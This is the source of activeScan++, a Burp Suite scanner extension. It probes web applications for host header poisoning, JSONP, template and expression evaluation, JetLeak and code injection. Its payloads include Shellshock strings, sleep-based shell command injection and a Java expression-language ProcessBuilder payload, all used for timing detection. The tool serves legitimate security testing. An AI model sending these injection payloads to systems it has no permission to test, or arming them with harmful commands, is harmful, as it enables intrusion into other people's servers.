# Author: James Kettle <albinowax+acz@gmail.com>
# Copyright 2014 Context Information Security up to 1.0.5
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    from string import Template
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
        IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "1.0.13"
FAST_MODE = False
callbacks = None
helpers = None


class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()

        callbacks.setExtensionName("activeScan++")

        callbacks.registerScannerCheck(PerRequestScan())

        if not FAST_MODE:
            # Register generic per-request insertion point provider
            # callbacks.registerScannerInsertionPointProvider(GenericRequestInsertionPointProvider())
            # callbacks.registerScannerCheck(CodePath())

            # Register host attack components
            # host = HostAttack()
            # callbacks.registerScannerInsertionPointProvider(host)
            # callbacks.registerScannerCheck(host)

            # Register other scan components
            callbacks.registerScannerCheck(CodeExec())
            callbacks.registerScannerCheck(SuspectTransform())
            callbacks.registerScannerCheck(JetLeak())
            callbacks.registerScannerCheck(JSONP())
            callbacks.registerScannerCheck(SimpleFuzz())

            callbacks.registerScannerCheck(ObserveTransform())

        print "Successfully loaded activeScan++ v" + VERSION

        return


class PerRequestScan(IScannerCheck):
    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        base_resp_string = helpers.bytesToString(basePair.getResponse())
        base_resp_print = tagmap(base_resp_string)
        issues = self.doHostHeaderScan(basePair, base_resp_string, base_resp_print)
        return issues


    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        insertion_point_type = insertionPoint.getInsertionPointType()
        insertion_point_name = insertionPoint.getInsertionPointName()
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()


        # pick the parameter most likely to be the first insertion point
        first_parameter_offset= 999999
        first_parameter = None
        for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML, IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
            for param in params:
                if param.getType() != param_type:
                    continue
                if param.getNameStart() < first_parameter_offset:
                    first_parameter_offset = param.getNameStart()
                    first_parameter = param
            if first_parameter:
                break

        if first_parameter.getName() == insertionPoint.getInsertionPointName():
            return True

        else:
            return False


    def doHostHeaderScan(self, basePair, base_resp_string, base_resp_print):

        rawHeaders = helpers.analyzeRequest(basePair.getRequest()).getHeaders()

        # Parse the headers into a dictionary
        headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])

        # If the request doesn't use the host header, bail
        if ('HOST' not in headers.keys()):
            return None

        # If the response doesn't reflect the host header we can't identify successful attacks
        if (headers['HOST'] not in base_resp_string):
            print "Skipping host header attacks on this request as the host isn't reflected"
            return None

        # prepare the attack
        request = helpers.bytesToString(basePair.getRequest())
        request = request.replace('$', '\$')
        request = request.replace('/', '$abshost/', 1)

        # add a cachebust parameter
        if ('?' in request[0:request.index('\n')]):
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
        else:
            request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1?cachebust=${cachebust}', request, 1)

        request = re.sub('(?im)^Host: [a-zA-Z0-9-_.:]*', 'Host: ${host}${xfh}', request, 1)
        if ('REFERER' in rawHeaders):
            request = re.sub('(?im)^Referer: http[s]?://[a-zA-Z0-9-_.:]*', 'Referer: ${referer}', request, 1)

        if ('CACHE-CONTROL' in rawHeaders):
            request = re.sub('(?im)^Cache-Control: [^\r\n]+', 'Cache-Control: no-cache', request, 1)
        else:
            request = request.replace('Host: ${host}${xfh}', 'Host: ${host}${xfh}\r\nCache-Control: no-cache', 1)

        referer = randstr(6)
        request_template = Template(request)


        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
        legit = headers['HOST']
        taint = randstr(6)
        taint += '.' + legit
        issues = []

        # Host: evil.legit.com
        (attack, resp) = self._attack(basePair, {'host': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print):

            # flag DNS-rebinding if the page actually has content
            if base_resp_print != '':
                issues.append(self._raise(basePair, attack, 'dns'))

            if taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'host'))
                print issues
                return issues
        else:
            # The application might not be the default VHost, so try an absolute URL:
            #	GET http://legit.com/foo
            #	Host: evil.com
            (attack, resp) = self._attack(basePair, {'abshost': legit, 'host': taint}, taint, request_template, referer)
            if hit(resp, base_resp_print) and taint in resp and referer not in resp:
                issues.append(self._raise(basePair, attack, 'abs'))

        # Host: legit.com
        #	X-Forwarded-Host: evil.com
        (attack, resp) = self._attack(basePair, {'host': legit, 'xfh': taint}, taint, request_template, referer)
        if hit(resp, base_resp_print) and taint in resp and referer not in resp:
            issues.append(self._raise(basePair, attack, 'xfh'))

        return issues

    def _raise(self, basePair, attack, type):
        service = attack.getHttpService()
        url = helpers.analyzeRequest(attack).getUrl()

        if type == 'dns':
            title = 'Arbitrary host header accepted'
            sev = 'Low'
            conf = 'Certain'
            desc = """The application appears to be accessible using arbitrary HTTP Host headers. <br/><br/>

                    This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                    Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>

                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
        else:
            title = 'Host header poisoning'
            sev = 'Medium'
            conf = 'Tentative'
            desc = """The application appears to trust the user-supplied host header. By supplying a malicious host header with a password reset request, it may be possible to generate a poisoned password reset link. Consider testing the host header for classic server-side injection vulnerabilities.<br/>
                    <br/>
                    Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                    <br/>
                    Resources: <br/><ul>
                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
                        <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                        </ul>
            """

        issue = CustomScanIssue(service, url, [basePair, attack], title, desc, conf, sev)
        return issue

    def _attack(self, basePair, payloads, taint, request_template, referer):
        proto = helpers.analyzeRequest(basePair).getUrl().getProtocol() + '://'
        if 'abshost' in payloads:
            payloads['abshost'] = proto + payloads['abshost']
        payloads['referer'] = proto + taint + '/' + referer

        # Load the supplied payloads into the request
        if 'xfh' in payloads:
            payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']

        for key in ('xfh', 'abshost', 'host', 'referer'):
            if key not in payloads:
                payloads[key] = ''

        # Ensure that the response to our request isn't cached - that could be harmful
        payloads['cachebust'] = str(time.time())

        request = request_template.substitute(payloads)

        attack = callbacks.makeHttpRequest(basePair.getHttpService(), request)

        response = helpers.bytesToString(attack.getResponse())

        requestHighlights = [jarray.array([m.start(), m.end()], 'i') for m in
                             re.finditer('(' + '|'.join(payloads.values()) + ')',
                                         helpers.bytesToString(attack.getRequest()))]
        responseHighlights = [jarray.array([m.start(), m.end()], 'i') for m in re.finditer(taint, response)]
        attack = callbacks.applyMarkers(attack, requestHighlights, responseHighlights)
        return attack, response





class JSONP(IScannerCheck):
    def doPassiveScan(self, basePair):
        resp = basePair.getResponse()
        respinfo = helpers.analyzeResponse(resp)
        mimetype = respinfo.getStatedMimeType().split(';')[0]
        json_types = ['script', 'JSON', 'text']
        if mimetype in json_types:
            body = helpers.bytesToString(resp[respinfo.getBodyOffset():])
            body = body.rstrip(' \r\n\t;')
            if '\n' not in body:
                request_headers = helpers.analyzeRequest(basePair.getRequest()).getHeaders()
                for header in request_headers:
                    if header.startswith('Cookie: '):
                        if re.match('^[ a-zA-Z_.0-9]+\(.*\)$', body, flags=re.DOTALL):
                            return [
                                CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                                [basePair],
                                                'JSONP',
                                                "The applications appears to be using JSONP. Malicious websites may be able to retrieve this data cross-domain.",
                                                'Tentative', 'Information')]
                        break
        return []

    def doActiveScan(self, basePair, insertionPoint):
        return []


# Ensure that error pages get passively scanned
# Stacks nicely with the 'Error Message Checks' extension
class SimpleFuzz(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        attack = request(basePair, insertionPoint, 'a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\')
        if tagmap(helpers.bytesToString(attack.getResponse())) != tagmap(helpers.bytesToString(basePair.getResponse())):
            launchPassiveScan(attack)

        return []

    def doPassiveScan(self, basePair):
        return []


# Try to tell whether the application accepts XML input
class CodePath(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        if insertionPoint.getInsertionPointName() != 'generic_request':
            return []

        xml_resp, xml_req = self._attack(basePair, 'application/xml')
        if xml_resp != -1:
            if xml_resp != tagmap(helpers.bytesToString(basePair.getResponse())):
                zml_resp, zml_req = self._attack(basePair, 'application/zml')
                assert zml_resp != -1
                if zml_resp != xml_resp:
                    # Trigger a passive scan on the new response for good measure
                    launchPassiveScan(xml_req)
                    return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                            [basePair, xml_req, zml_req],
                                            'XML input supported',
                                            "The application appears to handle application/xml input. Consider investigating whether it's vulnerable to typical XML parsing attacks such as XXE.",
                                            'Tentative', 'Information')]

        return []

    def _attack(self, basePair, content_type):
        modified, request = setHeader(basePair.getRequest(), 'Content-Type', content_type)
        if not modified:
            return -1, None
        modified, request = setHeader(request, 'Connection', 'close')
        result = callbacks.makeHttpRequest(basePair.getHttpService(), request)

        return tagmap(helpers.bytesToString(result.getResponse())), result

    def doPassiveScan(self, basePair):
        return []


# Detect suspicious input transformations
class SuspectTransform(IScannerCheck):
    def __init__(self):

        self.checks = {
            'quote consumption': self.detect_quote_consumption,
            'arithmetic evaluation': self.detect_arithmetic,
            'expression evaluation': self.detect_expression,
            'EL evaluation': self.detect_alt_expression,
        }

        self.confirm_count = 2

    def detect_quote_consumption(self, base):
        return anchor_change("''", ["'"])

    def detect_arithmetic(self, base):
        x = random.randint(99, 9999)
        y = random.randint(99, 9999)
        probe = str(x) + '*' + str(y)
        expect = str(x * y)
        return probe, expect

    def detect_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '${' + probe + '}', expect

    def detect_alt_expression(self, base):
        probe, expect = self.detect_arithmetic(base)
        return '%{' + probe + '}', expect

    def doActiveScan(self, basePair, insertionPoint):
        if (
                insertionPoint.getInsertionPointName() == "hosthacker" or insertionPoint.getInsertionPointName() == 'generic_request'):
            return []
        base = insertionPoint.getBaseValue()
        initial_response = helpers.bytesToString(basePair.getResponse())
        issues = []
        checks = copy.copy(self.checks)
        while checks:
            name, check = checks.popitem()
            for attempt in range(self.confirm_count):
                probe, expect = check(base)
                if isinstance(expect, basestring):
                    expect = [expect]

                print "Trying " + probe
                attack = request(basePair, insertionPoint, probe)
                attack_response = helpers.bytesToString(attack.getResponse())

                for e in expect:
                    if e in attack_response and e not in initial_response:
                        if attempt == self.confirm_count - 1:
                            issues.append(
                                CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                                'Suspicious input transformation: ' + name,
                                                "The application transforms input in a way that suggests it might be vulnerable to some kind of server-side code injection:<br/><br/> "
                                                "The following probe was sent: <b>" + probe +
                                                "</b><br/>The server response contained the evaluated result: <b>" + e +
                                                "</b><br/><br/>Manual investigation is advised.", 'Tentative', 'High'))

                        break

        return issues

    def doPassiveScan(self, basePair):
        return []


class ObserveTransform(IScannerCheck):

    def detect_backslash_consumption(self):
        return anchor_change("\\\\z", ["\\z"])

    def examine_backslash_handling(self):
        left = randstr(4)
        right = randstr(4)
        probe = left + '\\70z' + right
        expect = [left + 'pz' + right, left+'8z'+right]  # hex, octal
        return probe, expect

    def examine_slashx_handling(self):
        expect = randstr(8)
        probe = '\\x' + '\\x'.join([str(hex(ord(c)))[2:] for c in expect])
        return probe, [expect]

    def examine_null_handling(self):
        return anchor_change("\\0z", ["\x00z"])

    def check(self, basePair, insertionPoint, initial_response, probe, expectations):

        attack = request(basePair, insertionPoint, probe)
        attack_response = helpers.bytesToString(attack.getResponse())
        seen = []
        for expect in expectations:
            print 'Trying ' + probe + ' to ' + expect
            if expect in attack_response and expect not in initial_response:
                seen.append(expect)
        if not seen:
            return None
        return probe, seen, attack

    def doActiveScan(self, basePair, insertionPoint):
        if (insertionPoint.getInsertionPointName() == "hosthacker" or insertionPoint.getInsertionPointName() == 'generic_request'):
            return []

        initial_response = helpers.bytesToString(basePair.getResponse())

        results = [self.check(basePair, insertionPoint, initial_response, *self.detect_backslash_consumption())]

        if results[0] is None:
            return []

        results.append(self.check(basePair, insertionPoint, initial_response, *self.examine_backslash_handling()))
        results.append(self.check(basePair, insertionPoint, initial_response, *self.examine_slashx_handling()))
        results.append(self.check(basePair, insertionPoint, initial_response, *self.examine_null_handling()))

        requests = []
        detail = ''
        for result_set in results:
            if result_set is None:
                continue
            for output in result_set[1]:
                detail += '<li> From <b><code>'+result_set[0] + '</code></b> to <b><code>' + output + '</code></b></li>'
            requests.append(result_set[2])

        return [CustomScanIssue(results[0][2].getHttpService(), helpers.analyzeRequest(results[0][2]).getUrl(), requests,
                                                'Suspicious input decoding',
                                                "The application transforms input in a way that suggests it might be vulnerable to some kind of server-side code injection:<br/><br/> "
                                                "The following transformations were observed:<ul>" + detail +
                                                "</ul><br/><br/>Manual investigation is advised.", 'Tentative', 'High')]

    def doPassiveScan(self, basePair):
        return []

# Detect CVE-2015-2080
# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
class JetLeak(IScannerCheck):
    def doActiveScan(self, basePair, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():
            return None
        attack = request(basePair, insertionPoint, "\x00")
        resp_start = helpers.bytesToString(attack.getResponse())[:90]
        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                                    'CVE-2015-2080 (JetLeak)',
                                    "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
                                    "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information",
                                    'Firm', 'High')]
        return None

    def doPassiveScan(self, basePair):
        return []


# This extends the active scanner with a number of timing-based code execution checks
# _payloads contains the payloads, designed to delay the response by $time seconds
# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self):
        # self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['() { :;}; /bin/sleep $time',
                    '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`'],
            'php': [],
            'perl': ['/bin/sleep $time|'],
            'ruby': ['|sleep $time & ping -n $time localhost'],
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }

    def doActiveScan(self, basePair, insertionPoint):
        if (
                insertionPoint.getInsertionPointName() == "hosthacker" or insertionPoint.getInsertionPointName() == 'generic_request'):
            return []

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if (self._attack(basePair, insertionPoint, payload, 11)[0] > baseTime + 6):
                print "Suspicious delay detected. Confirming it's consistent..."
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                    if (timer > dummyTime + 6):
                        print "Code execution confirmed"
                        url = helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            print "Skipping report - vulnerability already reported"
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds", 'Firm', 'High')]

        return None

    def _getLangs(self, basePair):
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''

        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code

    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = request(basePair, insertionPoint, payload)
        timer = time.time() - timer
        print "Response time: " + str(round(timer, 2)) + "| Payload: " + payload

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)

    def doPassiveScan(self, basePair):
        return []


class GenericRequestInsertionPointProvider(IScannerInsertionPointProvider):
    def getInsertionPoints(self, basePair):
        return [GenericRequestInsertionPoint(basePair)]


class GenericRequestInsertionPoint(IScannerInsertionPoint):
    def __init__(self, basePair):
        self.basePair = basePair

    def getInsertionPointName(self):
        return "generic_request"

    def getBaseValue(self):
        return ''

    def buildRequest(self, payload):
        if payload != 'ignoreme':
            return None

        return self.basePair.getRequest()

    def getPayloadOffsets(self, payload):
        return None

    def getInsertionPointType(self):
        return INS_EXTENSION_PROVIDED


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


# misc utility methods

def launchPassiveScan(attack):
    service = attack.getHttpService()
    using_https = service.getProtocol() == 'http'
    callbacks.doPassiveScan(service.getHost(), service.getPort(), using_https, attack.getRequest(),
                            attack.getResponse())
    return


def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def randstr(length=12, allow_digits=True):
    candidates = string.ascii_lowercase
    if allow_digits:
        candidates += string.digits
    return ''.join(random.choice(candidates) for x in range(length))


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))

def anchor_change(probe, expect):
    left = randstr(4)
    right = randstr(4, allow_digits=False)
    probe = left + probe + right
    expected = []
    for x in expect:
        expected.append(left + x + right)
    return probe, expected

# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))


def request(basePair, insertionPoint, attack):
    req = insertionPoint.buildRequest(attack)
    ignore, req = setHeader(req, 'Connection', 'close')
    return callbacks.makeHttpRequest(basePair.getHttpService(), req)


def setHeader(request, name, value):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = helpers.bytesToString(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\n'.join(headers) + '\n') + request[body_start:]
    else:
        modified_request = request
    return modified, modified_request
